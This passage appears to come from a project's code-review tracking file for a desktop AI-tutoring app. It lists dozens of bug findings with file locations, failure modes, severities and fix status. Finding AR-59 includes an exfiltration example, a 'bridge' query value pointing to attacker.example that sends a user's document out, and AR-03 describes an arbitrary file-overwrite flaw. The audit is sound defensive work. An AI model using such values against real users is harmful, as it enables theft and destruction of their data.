| D-19 | `_parse_timestamp` raises `ValueError` on corrupt rows | Corrupt timestamps need a supported corruption/migration fixture; changing exception type does not repair data. |
| D-20 | Character-based focus budget approximation | Character/token approximation is documented as a bound estimate; calibration belongs to model-output work. |
| D-22 | Credential service naming compatibility | Retaining the old keyring service name preserves user credentials; a cosmetic rename would require migration. |

### Related review checks

Duplicates below are references, not additional tasks. Original severities are not
accepted without evidence. Confirmed citation, archive and connection defects were
handled in the main pass; remaining claims require assessment before code changes.

| Review ID | Location / existing task | Candidate or disposition |
| --- | --- | --- |
| REV-C1 | `common/provider.py` | Bound adaptation-cache growth under many endpoint/model failures; measure realistic growth before selecting an eviction policy. |
| REV-C2 / REV-L18 | P-05 | Verify tokenizer/model download integrity and byte caps; revision pinning and hash pinning provide different guarantees. |
| REV-C3 | `api/settings.py` | Setting a key can create a preset connection. Determine whether the UI/API intends this behavior and test it; do not assume it is critical. |
| REV-H1 / REV-H2 | C-15; `api/sources.py` | Measure whole-file storage/source-response memory and consider bounded streaming; gzip accumulation is also a whole-result cost. |
| REV-H4 | P-07 | Same course embedding materialization candidate. |
| REV-H5 / REV-M10 | `student_model/learning.py` | Profile observations and suites in targets on realistic history; batch/index only when cost warrants it. |
| REV-H6 / REV-M15 | `common/course_memory.py` | Profile full-material focus refresh and query costs; preserve evidence/freshness if introducing incremental updates. |
| REV-H7 | P-01 | Same settings/environment parsing cost candidate. **Fixed in code — awaiting verification.** |
| REV-H8 | Policy loaders | Process-lifetime config caches need change only if reload is promised; define invalidation for development/tests if required. |
| REV-H9 | `common/sources_repo.py` | Temporary paths can coincide, causing duplicate missing_ok cleanup. Low-impact clarity candidate, not a demonstrated failure. |
| REV-M1 | `tutor/answer.py`; `common/generation.py` | **Fixed in code — awaiting verification:** one operation budget now covers output recovery, schema fallback, content repairs and HTTP adaptations. Cutoff retries retain scope/evidence; empty retries are separately bounded. `test_generation.py`/`test_chat_flow.py` verify exhaustion, billing and no partial publication. Live latency/completion remains STK-038/B-06. |
| REV-M2 / REV-M3 / REV-M16 / REV-M17 | API/repository transaction lifetimes | Inspect actual connection ownership and writer overlap. create_suite already accepts conn; its alleged nested connection is unsupported. Independent usage writes and short read connections can be intentional. No blanket connection-pool/refactor mandate. |
| REV-M4 | `common/maintenance.py` | Test whether a failed purge should prevent orphan sweep; preserve safe deletion ordering before independently recovering phases. |
| REV-M5 | D-08 | Same migration transaction-boundary candidate; verify actual call context before changing executescript. |
| REV-M6 | `api/sources.py` | Page 0/negative return 404; nonintegers return 422. API validation consistency candidate, not demonstrated broken behavior. |
| REV-M9 | `student_model/learning.py` | Consider direct replay return instead of bounded recursive submission retry; preserve idempotency, course/suite conflict validation, and source scope. |
| REV-M11 | B-06; `tutor/compose.py` | Exercise quiz heuristic false acceptance/refusal against independently reviewed cases, including numeric values and dates. |
| REV-M12 | `tutor/workspace.py` | Test the specific fence parsing case before reopening: nested Markdown fences already have regression coverage; extracting a fence and json.loads are separate steps. |
| REV-M13 | `ingest/extract.py` | Evaluate justified prose, merged-cell tables, and layout heuristics with extraction ground truth before adopting another parser. |
| REV-M14 | P-15 | Same settings/provider overview query/keyring cost candidate. |
| REV-L1 | `common/provider.py` | Local base64 import is a style-only candidate; Python caches imports. No functional defect established. |
| REV-L2 | `common/config.py` | Test escaped/quoted .env values against documented development configuration; choose parser complexity based on actual supported syntax. **Fixed in code — awaiting verification.** |
| REV-L3 | `common/db.py` | The connection closes uncommitted transactions, which SQLite rolls back; no bug follows from lacking an explicit rollback. Add a case only if lifecycle behavior differs. |
| REV-L4 | `common/db.py` | Inspect actual cross-thread connection sharing/ownership before changing check_same_thread; the flag alone does not prove a race. |
| REV-L6 | `common/providers.py` | resolve_choice is a read seam supporting legacy presets; do not replace it with a mutating ensure helper without a product migration contract. |
| REV-L9 | `api/deps.py` | A shared missing-or-invalid token message is intentional nondisclosure; no demonstrated problem requires different auth errors. |
| REV-L10 | `common/db.py` | Check json_ids caller typing and query contracts; do not assume every call is necessarily a UUID-only API. |
| REV-L11 | `common/encoders.py` | Profile batch peak memory when hidden is reassigned; a retained batch temporary is not an established persistent leak. |
| REV-L12 | `common/work_archive.py` | Missing live source mappings intentionally preserve embedded quotes with cleared links/new snapshot IDs. Verify archive rendering; raising on every missing chunk would discard supported archived passages. |
| REV-L13 | C-52; `common/archive_notebook.py` | Verify validated cited_ids populate mappings before import; preserve rejection/repair semantics. Falling back to old UUIDs can create dangling cross-course references. |
| REV-L14 | `api/learning.py` | Exactly one saved-message or artifact input is required. Readability-only candidate; preserve the existing validation. |
| REV-L15 | `common/learning_config.py` | Check whether configurable evidence thresholds need an upper bound; avoid arbitrary limits unrelated to the learning policy. |
| REV-L17 | `api/data.py` | Repeated path resolution is a low-impact clarity candidate; preserve containment and symlink behavior. |

## Code review fixes awaiting verification — AR-* findings

Reviewed 2026-10-04. **Every original bug entry is retained until the user retests
it.** “Fixed in code” records implementation and mechanical evidence; it does not
mean semantic or installed-platform acceptance. Original locations/line numbers
below describe the reviewed version and may have moved.

Final local checks for this pass: **1,020 backend tests, 30 frontend tests and
58 Office add-in tests passed**; Python lint/format/mypy and both frontend/add-in
type checks passed. API types were regenerated. Native Rust tests are present but
unexecuted; no native compilation or live model/corpus run was performed.

Second fix pass (AR-72…AR-83, above): **1,026 backend tests and 31 frontend tests
passed**; Python lint/format/mypy and both frontend/add-in type checks passed. No
new native or live-model run.

Implementation evidence (local fixtures, with user retesting still pending):

| Area | Regression evidence / remaining verification |
| --- | --- |
| Numbered sources, practice and citations | `test_citations.py`, `test_learning.py`, `test_practice_support.py`, `test_compose.py`, `test_office_assistant.py`, `test_archive_numbering.py`; sparse source #2 stays correct after course import. B-06 still owns entailment and teaching quality. |
| Ingestion/OCR/extraction | `test_extract.py`, `test_ingestion_worker.py`, `test_ingestion_runs.py`, `test_ingestion_pipeline.py`, `test_passage_store.py`; bad boundaries preserve usable text, requests stay bounded and pages retain identity. The five-PDF corpus and digits remain unverified locally. |
| Similarity refresh | `test_graph_edges.py`; source refresh matches full-course inbound/outbound top-k, invalid dimensions are excluded and failed scoring preserves the prior graph. Large-course cost is still B-07. |
| Runtime/provider/API/archive failures | `test_review_regressions.py`, `test_providers.py`, `test_settings_api.py`, `test_artifacts.py`; actionable failures, key compensation, redirect transport and nullable legacy source hashes. Native process fault coverage is still B-10. |
| UI, quiz state and export delivery | Frontend `backend`, `export`, `chat`, `practice`, `quizSessionScope`, `artifactRecovery` and `busyOwner` behavior tests. They include a binary-vs-JSON export regression. Native export/restart unit tests are present but unexecuted under the no-compilation constraint. |
| Generated material structure | `test_compose.py` covers section/slide boundaries, title-only/duplicate/miscount rejection and intro citations; `test_artifacts.py` follows document/deck drafts through saved chat, idempotent adoption, reopen and cited export. Actual model replays remain R2-NEW-5/B-06. Narrow textarea/quiz changes pass Svelte checks but need STK-043 GUI retesting. |
| Shared output recovery | `test_generation.py`, `test_generation_config.py`, `test_providers.py` and `test_chat_flow.py`: known/unknown allowances, shared schema/content/HTTP budgets, deadlines/cancellation, billed failures, pinned routing, visible rate-limit fallback and no incomplete quiz publication. Real-model output quality and multi-unit/resume behavior remain open. |
| Usage completeness | `test_usage_reporting.py` follows reported/missing/partial/malformed counts through operation accounting, the ledger and Settings, and upgrades historical rows without inventing provenance. `test_backups.py` preserves completeness on full restore; reduced tiers still omit usage. Monthly budget remains the C-63 soft stop. |
| Office setup and bridge | `test_office_addin_setup.py`, `test_office_macos_service.py`, bridge/live-pane tests; declined trust, rollback, pending cleanup and stale connection ownership use fakes. Real trust/registration/reconnect remains B-10. |

Retaking clears current-attempt help flags; the server still recognizes previously
revealed questions as assisted. This avoids both false help flags and false mastery.

### Critical / HIGH — verification priority

| ID | Original location | Original reported failure | Current status | Sev |
| --- | --- | --- | --- | --- |
| AR-01 | `tutor/answer.py:300` (`calls[-1]`) + `tutor/compose.py:878-885` | Ask for a quiz with a count outside 1–20 (e.g. "make me a 50-question quiz"): `compose_answer` returns a canned message **without calling `generate`**, so `calls` is still `[]` and `calls[-1]` raises `IndexError` → **500** instead of the intended 4xx/200 message. `calls` is created empty at line 147 and only appended in the `generate` wrapper (line 180). | Fixed in code — awaiting verification | HIGH |
| AR-02 | `tutor/answer.py:303-304` + `student_model/learning.py` (`create_suite`) | Workspace quiz `sources`/`[n]` are numbered against the **full candidate list**, but `Answer.__init__` re-gates with `extract_workspace_items(text, len(chunk_ids))` where `chunk_ids` is only the **prose-cited subset**. A quiz citing valid material #3 is wrongly withheld ("only material [1] provided"); a quiz citing `[1]` records evidence `chunk_ids[0]` = the **wrong chunk**, so later practice help grounds on the wrong passage. | Fixed in code — awaiting verification | HIGH |
| AR-03 | `api/artifacts.py:557-589` | `POST .../artifacts/{aid}/export` writes artifact bytes to `Path(payload.path)` with **no containment** and overwrites via `write_bytes`. Only checks: suffix match (which *appends* ext on mismatch, `notes.txt`→`notes.txt.py`) and `parent.is_dir()`. Contrast `api/data.py:156-172` containment. Any app-token holder gets an **arbitrary-file-overwrite** primitive. | Fixed in code — native Save/replacement acceptance pending (B-10) | HIGH |
| AR-04 | `frontend/.../stores/practice.svelte.ts:131` | `reset()` ("Try again") sets `this.helped = questions.map(() => true)` (constructor correctly uses `false`). `helped` is submitted verbatim and drives "assisted ≠ independent". Retaking a quiz marks **every answer as helped** → `independent_items` never accrues, course-memory proficiency systematically corrupted. Uncovered by tests. | Fixed in code — awaiting verification | HIGH |
| AR-05 | `frontend/.../components/WorkCompanion.svelte:302-323` (also 226-263) | `busy = true` before an `await`; every exit clears it only `if (current(token))`. Switching session/course (selects not disabled) mid-request bumps `epoch` → bare `return` leaves `busy` **stuck true forever**; all buttons disabled, "Working…" until window close. Same leak in `operation()`/`removeSession()`. | Fixed in code — awaiting verification | HIGH |
| AR-06 | `runtime/server.py:217-233` (`ensure_binary`, 59-92) | `LlamaServer.start()` catches only `(RuntimeUnavailableError, OSError)` but `download_verified` raises `DownloadError`/`DownloadCancelled`/`httpx.HTTPError` and unpack raises `BadZipFile`/`TarError`. Download failure: escapes past the per-key `continue` (Vulkan→CPU fallback never runs), bypasses `_ensure_local_runtime` conversion (raw error, not "download it or pick another model"), and leaves `state="starting"`/`_error=None` **forever** → zombie "starting", `check_and_restart` never recovers. | Fixed in code — awaiting verification | HIGH |
| AR-07 | `runtime/supervisor.py:38-46` | Loop has no exception guard around `check_and_restart` (which itself only catches `RuntimeUnavailableError`). Any `sqlite3.OperationalError`, corrupt-row `ValidationError`, or `DownloadError` (AR-06) propagates out of `run_forever`; the `finally` then **stops the local model** and the supervisor is dead for the session. Transient DB hiccup = supervision gone + model off. | Fixed in code — awaiting verification | HIGH |
| AR-08 | `artifacts/edit.py:312,333` + `artifacts/attribution.py:78-103` | Slides' `before` is `json.dumps(shown)`; slide body lines never appear as whole lines of that dump, so `strip_echo`'s "a line in `before` is never removed" guard **never fires**. Student's pasted multi-line content is classified as "pasted material echo" and **deleted from the proposal**; `attach` also adds `[n]` to untouched student lines. Destroys user work on accept. | Fixed in code — awaiting verification | HIGH |

### Medium

| ID | Original location | Original reported failure | Current status | Sev |
| --- | --- | --- | --- | --- |
| AR-09 | `tutor/answer.py:303` | `chunk_ids = tuple(cited) or tuple(all candidates)`: an answer citing **nothing** (common with small models) is recorded as citing **every retrieved chunk**; inflated evidence is cached and fed to the learning model / teaching events. | Fixed in code — awaiting verification | M |
| AR-10 | `ingest/orchestrator.py:138-174` (`ocr_pages.py:24`, `extract.rasterize_pages`) | `_ocr_weak_pages` catches only `ProviderUnavailableError`, but `split_ocr_pages` raises `ValueError` on boundary-count mismatch (models append `"\n\n---\n\n"`). A 50-good + 2-blank-page PDF: OCR `ValueError` not caught → both retries fail (re-billing) → whole source **failed & unindexed** despite 50/52 usable pages. Contract says "a mixed PDF must still index." | Fixed in code — awaiting verification | M |
| AR-11 | `ingest/pipeline.py:66-85` | Stage retry loop retries **every** `Exception` up to `max_attempts` in a tight loop (no sleep), including deterministic failures (`UnsupportedSourceTypeError`, `EmptyExtractionError`, AR-10's `ValueError`). 200 MB corrupt PDF re-parsed; transient outage retried with no backoff; run ledger falsely says "failed after 2 attempts." | Fixed in code — awaiting verification | M |
| AR-12 | `ingest/orchestrator.py:171-173` (`extract.py:737`) | `apply_page_ocr(..., indexes[:len(recognized)], recognized)` pairs recognitions with the first N flagged indexes, but `rasterize_pages` **filters** out-of-range indexes. If a filtered page isn't last, OCR text is spliced onto the **wrong pages** (silent, permanent miscitation). Fix: zip against the rendered index list. | Fixed in code — awaiting verification | M |
| AR-13 | `graph/edges.py:144-164` | `build_source_edges` deletes **all** edges touching a source's chunks but recreates only pairs in *this* source's top-k; a full build keeps a pair if *either* side lists the other. Re-ingest (IDs reused) deletes an edge created from the other endpoint's top-k and **never recreates** it → `similar_candidates`/`course_graph` silently lose the relation until a manual full rebuild. | Fixed in code — awaiting verification | M |
| AR-14 | `common/provider.py:473-475` | `int(usage.get("prompt_tokens", 0))` returns `None` (key present, value null) → `int(None)` `TypeError` → a **successful** completion is reported "unreadable reply" while usage was already recorded. The earlier parse at 407-409 correctly uses `or 0`; this one doesn't. | Fixed in code — awaiting verification | M |
| AR-15 | `api/learning.py:106-137` | `practice_from_saved` re-validates a stored quiz item as `PracticeQuestion` (caps prompt/explanation at 5000) with **no** `try`. `QuizQuestion` (what was stored) has **no** `max_length`, so an over-long prompt/explanation → `pydantic.ValidationError` escapes → **500** instead of 4xx. (`except ValueError` at line 158 only wraps `create_suite`.) | Fixed in code — awaiting verification | M |
| AR-16 | `api/sources.py:185-220` | `source_content`/`source_pdf_page` don't map `storage` failure modes (`FileNotFoundError`, `ValueError` corrupt-gzip, `DecompressionLimitExceededError`, pdfium errors) to 4xx. Missing/corrupt stored `.bin` → **500** instead of 404/410/422. Endpoint docs say a failed source "must never be silent," yet its read path 500s. | Fixed in code — awaiting verification | M |
| AR-17 | `api/learning.py:207-218` + `student_model/practice_support.py:239-248` | `get_question_help` maps `LookupError`→404, `ProviderUnavailableError`→503, `ValueError`→422, but `BudgetExceededError` (a `RuntimeError`) is **uncaught**. Budget exhausted (designed state) → practice help returns **500** instead of 402 (all sibling model endpoints map it to 402). | Fixed in code — awaiting verification | M |
| AR-18 | `api/office_setup.py:72-77` (+ `service.py`, `host.py`, `certs.py`, `manifest.py`) | `connect_office`/`open_in_office` catch only `OfficeSetupError`, but the path raises bare `OSError`/`ValueError`. `disconnect_office` (line 84-87) and `start_if_connected` already catch `OSError`. HTTPS-host/cert failure → **500** instead of the 409 the sibling uses. | Fixed in code — awaiting verification | M |
| AR-19 | `runtime/server.py:322-344` | `check_and_restart` reads the model under the lock, releases, then `start()` **outside** it; `start()` holds the lock through its multi-second health wait. Crash on A → supervisor queues `start(A)` → user picks B (`start(B)` runs to healthy) → queued `start(A)` then **stops B and relaunches A**, silently reverting the user's choice to the crashed model. | Fixed in code — awaiting verification | M |
| AR-20 | `runtime/server.py:430-437` | `ensure_running` is check-then-act (status read without lock). Two concurrent requests both see not-running → both `start()` → second **kills the healthy server** the first just brought up and relaunches. Under load the model cycles stop/start and in-flight generations get connection-refused. | Fixed in code — awaiting verification | M |
| AR-21 | `tutor/compose.py:968-970` | Quiz-repair loop `except Exception: if not on_schema_rejected(err): repaired = ""` swallows **every non-schema** error (network, truncation, budget) into `""` → student sees "couldn't create a trustworthy quiz" instead of the real 503/500. Sibling handlers at 916-919/1016-1018 correctly re-raise. Outage invisible to monitoring. | Fixed in code — awaiting verification | M |
| AR-22 | `tutor/compose.py:901` + `common/citations.py:85-88` | Answer-path validation withholds the **entire** reply if `cited_numbers(text)` has any `n` out of range. `cited_numbers` reads bare subscripts (`arr[0]`) as citation `[0]`, and `marker_numbers` injects a phantom `0` for reversed ranges (`[5-3]`→`{0,5,3}`). A correct answer containing `a[0]`/`[5-3]` is replaced with "referred to material it was not given." (Workspace path already avoids this trap.) | Fixed in code — awaiting verification | M |
| AR-23 | `evals/answer.py:67,273-279` | `CITATION_RE = r"\[(\d+)\]"` matches only single numbers, but quote mode emits comma-joined `[1, 2]` (`anchor_citations`) and `citations.py` accepts `[1-3]`. Eval `green_grounded` cases **falsely fail** ("no citations present"); grouped markers also escape `workspace_check` validity (false pass). Eval harness gates prompt changes. | Fixed in code — awaiting verification | M |
| AR-24 | `common/course_archive.py:150-153` (+ `queries/sources.sql:122-129`) | Course export builds `ArchiveSource(sha256=row["file_hash"])` (needs `^[0-9a-f]{64}$`) but `file_hash` is **nullable** (legacy rows). NULL/empty hash → `ValidationError` inside the zip-write `try` → partial archive deleted, raw error surfaces, course **permanently unexportable**. Backup path (`backups.py:241`) handles the same rows fine. | Fixed in code — awaiting verification | M |
| AR-25 | `office_reader/package.py:99-110` (170-179) | `_ordered_parts` collects **every** `<sheet>` (incl. chart sheets / Excel 4.0 macrosheets) but the fallback list only has `xl/worksheets/sheetN.xml`; `any(name not in fallback)` → `UnreadablePackageError("ordering references a missing part")`. A normal workbook with one chart sheet gets **zero extraction** (fail-closed on valid input). | Fixed in code — awaiting verification | M |
| AR-26 | `frontend/.../api/backend.ts:59-71` | Backup activation resets `origin`/`token` and only reconnects **on success**, but the Rust side **always** restarts the backend (even on failure, returning a healthy backend on a new port). Failed activation → `apiBase()` returns relative `"/api"` → requests hit `http://tauri.localhost/api/...` and die. Healthy backend, dead app, no recovery but quitting. | Fixed in code — awaiting verification | M |
| AR-27 | `frontend/.../api/client.ts:53-61` | `createClient({ baseUrl: apiBase() })` caches the URL **forever**; `activateBackup` documents "forget the cached connection" but never resets `rawClient`. Reconnects go to the old, dead port (in-flight autosave/flush → network error / "Not saved"). `DebugHost`/source viewer call `apiBase()` per request and are fine — inconsistent. | Fixed in code — awaiting verification | M |
| AR-28 | `frontend/.../stores/chat.svelte.ts:176-182, 265-283` | `this.turns = turns` proxies the array, but `loadCitations` is called on the **raw** turn objects. Raw writes don't bump Svelte 5 proxy sources → saved-conversation citations **never render** (newly-sent turns already proxied, so it passes manual testing). | Fixed in code — awaiting verification | M |
| AR-29 | `frontend/.../components/artifacts/QuizArtifact.svelte:20-24` | `$derived(new QuizSession{...})` spreads every question → invalidated by *any* edit. Flip "Edit questions"→"Take quiz" ⇒ brand-new session (answers/run lost, `practiceId=null`) and `connect()` POSTs a **new server-side suite** each cycle, orphaning prior runs' learning observations. | Fixed in code — awaiting verification | M |
| AR-30 | `frontend/src-tauri/src/library.rs:47-69` | On backup activation, the managed `BackendCell` is set `None` **before** `Backend::spawn`; if spawn fails (AV lock, missing resource) the function returns `Err` and `guard` stays `None` **permanently** → `backend_info` forever "the backend is restarting," the successful library swap is hidden behind a misleading error, no recovery path. | Fixed in code — native failed-spawn/retry acceptance pending (B-10) | M |
| AR-31 | `.github/workflows/release.yml:61` + `release-macos-linux.yml:107` | Release installers run `pip install -e ".[desktop]"` with **no `-c constraints.txt`** (every CI job uses it) and skip `freeze_constraints --check`. CI tests the pinned stack; release ships the **unpinned** one → a breaking transitive patch on tag day builds installers against untested deps. `constraints.txt` header states this is exactly its purpose. `desktop` extra (pyinstaller) also unpinned. | Fixed in code — awaiting verification | M |

### Low

| ID | Original location | Original reported failure | Current status | Sev |
| --- | --- | --- | --- | --- |
| AR-32 | `runtime/server.py:284-301` | Health check accepts **any** 200 on the configured port, so a foreign process (user's llama-server, LM Studio, stale server w/o pidfile) yields a false "running" with a dead child; `generate` talks to the wrong model and restarts loop reports "keeps crashing," never the real port-collision cause. | Fixed in code — awaiting verification | L |
| AR-33 | `common/provider.py:371-378` | `httpx.post(...)` without `follow_redirects=True` (downloads.py/user_models both set it). A 3xx passes the `<400` "success" gate → `response.json()` on the redirect body → "unreadable reply." Hits self-hosted/proxied endpoints (http→https, trailing-slash). | Fixed in code — awaiting verification | L |
| AR-34 | `common/providers.py:295-314` (`remove_connection`) | API key deleted from keychain **before** the DB commit. Commit fails (busy timeout) → rollback leaves the row/choices intact but the key is **gone** → endpoint dead "key missing," no record of why. | Fixed in code — awaiting verification | L |
| AR-35 | `runtime/user_models.py:125` | `int(lfs.get("size") or entry["size"])` raises bare `KeyError` on a malformed HF tree response (no `lfs.size`, no `size`) → **500** with raw traceback instead of the designed "couldn't reach HF / not a GGUF" message. | Fixed in code — awaiting verification | L |
| AR-36 | `ingest/extract.py:239-245` | NUL-density "binary" heuristic `count(b"\x00") > len/10` misfires on **short** files: `b"a\x00b"` rejected as "binary" while identical content padded with text is accepted and NUL-stripped. BOM-less UTF-16 also always rejected as "binary." | Fixed in code — awaiting verification | L |
| AR-37 | `ingest/extract.py:262-270` | cp1252 fallback uses `errors="strict"`; cp1252 **rejects** `0x81 0x8D 0x8F 0x90 0x9D`, so the exact legacy bytes the fallback covers crash it. `latin-1`/`replace` final fallback would decode. | Fixed in code — awaiting verification | L |
| AR-38 | `ingest/extract.py:347-351` | Whitespace-only preamble gets **no locator** (`if text[:first_start].strip()`), violating "every character stays addressable"; citations near file top attribute to the following section via fallback. | Fixed in code — awaiting verification | L |
| AR-39 | `graph/vectors.py:27` | Dimension-consistency guard uses `rows[0]["dimension"]` (arbitrary cohort) instead of the configured model dimension. A same-name dimension swap can rank graph edges from a **stale vector space** (and `similar_candidates` has no dimension check). | Fixed in code — awaiting verification | L |
| AR-40 | `api/learning.py:122-126, 134-137` | `UUID(assigned)`, `UUID(cid)`, `item["questions"]` `KeyError`, `.get()` on a non-dict item all unguarded alongside AR-15 (see those failure modes; same 500-instead-of-4xx class). | Fixed in code — awaiting verification | L |
| AR-41 | `api/settings.py:291-294` (`set_key`) | `KeyUpdate.key` allows whitespace-only; `set_key` strips to `""` and writes it to the keyring, **overwriting a good key** and returning 204. `add_connection` (line 259) guards this exact case; `set_key` doesn't. | Fixed in code — awaiting verification | L |
| AR-42 | `api/tutor.py:164-180` | `trace_citations` walks stored `retrieved_chunk_ids` JSON with unguarded `UUID(cid)`/`int(raw_markers[i])` (and `str(cid)` on a `None` value → `TypeError`). Legacy/malformed trace row → `GET .../traces/{tid}/citations` **500**. | Fixed in code — awaiting verification | L |
| AR-43 | `api/office.py:463-471` (`publish_package`) | `except Exception` wraps `_decode` and re-labels its deliberate `HTTPException(422,"package_b64 is not valid base64")` as "The Office document could not be read." Misleading diagnostics; also masks internal `TypeError` as client fault. | Fixed in code — awaiting verification | L |
| AR-44 | `api/companion.py:242-250` (`delete_work`) | Existence check + DELETE + **always** `{"deleted": True}` (rowcount never checked) → TOCTOU/concurrent delete yields a false success. | Fixed in code — awaiting verification | L |
| AR-45 | `api/settings.py:247-261` (`add_connection`) | Connection row committed, **then** `secrets.set_api_key`. Keyring raises `CredentialStoreUnavailableError` → 503, but the connection is **already persisted without its key**; retry POSTs duplicate it (no dedup). | Fixed in code — awaiting verification | L |
| AR-46 | `api/office.py:372-379` (`read_document`) | Contract: optional method failures become warnings so "one bad method never sinks the others." But `read_screens` → `provider.generate` can raise `BudgetExceededError` (not `ProviderUnavailableError`) → **500** sinks the whole merge despite a good `scrape`. | Fixed in code — awaiting verification | L |
| AR-47 | `tutor/compose.py:1081-1091` + `tutor/quotes.py:136-137` | Quote-mode plain-text fallback and `anchor_citations` (all-quotes-rejected) skip the out-of-range citation check, leaving a dangling `[99]` in the body (and AR-09 marks all chunks as evidence). | Fixed in code — awaiting verification | L |
| AR-48 | `student_model/learning.py:71-82` + `tutor/answer.py:359-362` | `create_suite` idempotent fallback compares `r["origin"] == origin`, but `origin` embeds `teaching_context` with raw `datetime`/`UUID` serialized via `default=str`; dict equality can **never** hold → duplicate-origin retries raise instead of returning the existing suite. | Fixed in code — awaiting verification | L |
| AR-49 | `tutor/quotes.py:58` | `position = found + 1` after each ellipsis segment lets the next segment re-match inside the previous span → words counted twice; an unsupported-in-sequence quote passes the verbatim gate. | Fixed in code — awaiting verification | L |
| AR-50 | `tutor/chat.py:257` | Rolling `summarize` uses `result.text` without `strip_fence_echo`; a fence echo fills the 1200-char summary with echoed transcript. | Fixed in code — awaiting verification | L |
| AR-51 | `student_model/research.py:124-125` | `except Exception` logs **without** `exc_info`/error → schema drift (e.g. `$defs["ResearchHypothesis"]` rename), DB, and provider failures all become one identical line; experiment-creation loss goes undiagnosed. | Fixed in code — awaiting verification | L |
| AR-52 | `student_model/practice_support.py:253, 259-261` | Help-citation visibility check `re.findall(r"\[(\d+)\]", ...)` is blind to grouped `[1, 2]` → `visible <= declared` trivially passes and `missing = declared - visible` re-appends duplicate "Sources: [1] [2]" tails. | Fixed in code — awaiting verification | L |
| AR-53 | `tutor/office.py:252-269` | Office answers never validate the model's `[n]` markers and `_citations` returns **every** candidate as a citation regardless of what was cited → dangling `[42]` and false evidence in the pane. | Fixed in code — awaiting verification | L |
| AR-54 | `tutor/work.py:227` | `(?<!D)\[(\d+)\]` lookbehind drops legitimate citations ("vitamin D[2]" loses `[2]`) for a `[D1]` case `\[(\d+)\]` can't match anyway; a fabricated `D[99]` evades the subset check. | Fixed in code — awaiting verification | L |
| AR-55 | `evals/answer.py:321-323` (+ :74) | `FABRICATED_SPECIFIC_RE` scans the raw answer **including citation markers** despite the docstring ("Citations are NOT evidence of fabrication"), so a refusal citing `[104]` in a 100+ chunk course scores "fabricated specifics." | Fixed in code — awaiting verification | L |
| AR-56 | `office_addin/host.py:114-126` | Loopback sockets bound without `SO_REUSEADDR` on POSIX → the documented cert-renewal restart fails in TIME_WAIT with a misleading "port in use (another copy running?)" error; add-in stays down. | Fixed in code — awaiting verification | L |
| AR-57 | `office_addin/host.py:82-95` (and 62-75) | 5-second stop deadline `raise`s and skips cleanup (`live.BROKER.clear()`, manifest/cert deletion); `start()`'s `except BaseException: self._stop_locked(); raise` can **replace the original** startup exception. | Fixed in code — safe stop refusal retained; Office rollback/native acceptance pending | L |
| AR-58 | `office_addin/windows.py:78-98` | `certutil` `subprocess.run` with **no timeout** (macOS path uses 30s); `certutil -addstore` shows an interactive dialog → unanswered, the API worker thread **blocks forever**. | Fixed in code — awaiting verification | L |
| AR-59 | `office-addin/public/bridge.js:13-16` + `taskpane.js:34-35` | `?bridge=` query override with **no scheme/host allowlist**; the pane POSTs the whole document (`/office/read`, `publishDocument`, `assistRequest`) to `${BRIDGE}`. `?bridge=https://attacker.example` **exfiltrates the document**. | Fixed in code — awaiting verification | L |
| AR-60 | `office-addin/public/taskpane.js:70-76` + `live-pane.js:40-59` | Poll loop `tick()` error path calls `stop()` **without** `disconnectLive()` → local loop stops (`binding` null) but the server-side `connection_id` is never DELETEd → orphaned live connections accumulate on transient failures. | Fixed in code — awaiting verification | L |
| AR-61 | `frontend/.../routes/(app)/courses/[id]/artifacts/[artifactId]/+page.svelte:59-62` | `onDestroy` calls `open.dispose()` (sets `destroyed=true`) **then** `open.flush()`; `save()` early-returns when `destroyed` → unmount save is a **no-op**. Dirty edits survive only as a local recovery draft. Swap the two statements. | Fixed in code — awaiting verification | L |
| AR-62 | `frontend/.../components/SheetView.svelte:18-26` | `URL.revokeObjectURL(url)` called **synchronously** after `link.click()` → can cancel the CSV download in some webviews. `EditableDocument.svelte:29-30` does the same thing but delays 2s **with a comment explaining why**. | Fixed in code — awaiting verification | L |
| AR-63 | `frontend/.../components/artifacts/SlidesEditor.svelte:41` | `document.documentElement.requestFullscreen?.().catch(() => {})`: if the method is absent, `?.()` yields `undefined` and `.catch` throws `TypeError` (unhandled rejection during "Present"). | Review claim cleared — optional-call chain short-circuits; retain for user verification | L |
| AR-64 | `frontend/src-tauri/src/library.rs:49-58` (`backend.rs:131-154`) | `BackendCell` mutex held across a **20-second** blocking `shutdown()`; any concurrent `backend_info` (webview `connectBackend`) blocks for the whole duration → UI hangs with no feedback. | Fixed in code — native restart/race acceptance pending (B-10) | L |
| AR-65 | `scripts/eval_passages.py:48,60-75` | `started = time.perf_counter()` set once per pass, but `segmentation_seconds: perf_counter()-started` written **per case** → every case reports cumulative pass time, not its own cost (latency column unusable). | Fixed in code — awaiting verification | L |
| AR-66 | `scripts/eval_passages.py:61,67-71,84-91` | `text.index(case["evidence"])` raises `ValueError` if a case string drifts (script dies, uses first occurrence); `overlap/(b-a)` and `sum(...)/len(results)` can **divide by zero** (empty span / no matching cases). | Fixed in code — awaiting verification | L |
| AR-67 | `scripts/freeze_constraints.py:47-52` | Requirement-name parser strips `; [ >= == < ~= >` but **not** `!=`, `<=`, `===`, `@` (direct URL) or space-padded specifiers → `name` becomes e.g. `foo!=1.0` and `version()` raises `PackageNotFoundError`; `constraints.txt` can't be regenerated. | Fixed in code — awaiting verification | L |
| AR-68 | `run.sh:6-13` | Accepts the **Windows** venv layout (`.venv/Scripts/python.exe`) as valid on macOS/Linux, then `backend.rs::launch_command` looks for `.venv/bin/python` and fails at startup. | Fixed in code — awaiting verification | L |
| AR-69 | `.github/workflows/release.yml:38` + `release-macos-linux.yml:76` | Release pip `cache-dependency-path: pyproject.toml` omits `constraints.txt` (ci.yml includes both) → stale/inconsistent cache. Harmless until AR-31 is fixed. | Fixed in code — awaiting verification | L |
| AR-70 | `.github/workflows/ci.yml:53-55` | `python -m ruff check .` lints the whole tree (incl. scratch archives `.pytest_*/`, `build/pyinstaller/**`) while `ruff format --check` is scoped to `src/backend scripts tests` and `mypy` to `src`; no `[tool.ruff] exclude`. A stray generated `.py` fails the Ruff gate. | Review claim cleared — Ruff honors ignored scratch/build paths; retain for user verification | L |
| AR-71 | `common/config.py` (`_load_dotenv`, `get_settings`) | (a) `.env` re-read+re-parsed on **every** `get_settings()` call (hot path via `deps`); (b) naive `value.strip().strip('"').strip("'")` quote handling mangles values like `'C:\path\'`; (c) `int(os.getenv("APP_OFFICE_PORT",...))` raises a bare `ValueError` on a malformed value instead of a clean config error. Partially overlaps `REV-L2`. | Fixed in code — awaiting verification | L |

### Second fix pass — 2026-10-04 (AR-72…AR-83)

